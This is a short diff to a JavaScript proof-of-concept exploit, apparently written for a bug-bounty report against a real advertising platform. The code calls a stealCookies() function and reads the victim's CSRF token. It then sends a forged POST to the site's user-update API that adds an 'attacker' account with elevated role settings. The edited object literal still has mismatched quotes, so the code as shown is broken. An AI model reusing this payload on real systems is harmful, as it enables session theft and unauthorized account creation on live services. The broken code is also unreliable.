@@ -19,7 +19,7 @@ function getCookie(cname)
 stealCookies();
 
 const csrfToken = getCookie("csrftoken");
-const addNew = '{"name":"attacker","email":"johnstone+attacker' + Math.floor(Math.random() * 1000) + '@wearehackerone.com","role_info_list":[{"type":2}],"operator_type":1}‘;
+const addNew = {"name":"attacker","email":"johnstone+attacker' + Math.floor(Math.random() * 1000) + '@wearehackerone.com","role_info_list":[{"type":2}],"operator_type":1};
 // a POST request
 const response = fetch('https://www.pangleglobal.com/media/api/user/update', {
   method: 'POST',
@@ -27,7 +27,7 @@ const response = fetch('https://www.pangleglobal.com/media/api/user/update', {
   'Content-Type': 'application/json; charset=utf-8',
   'X-Csrf-Token':csrfToken
   },
-  body: JSON.stringify(newProduct),
+  body: JSON.stringify(addNew),
 })
 console.log('status:', response.status) 
 
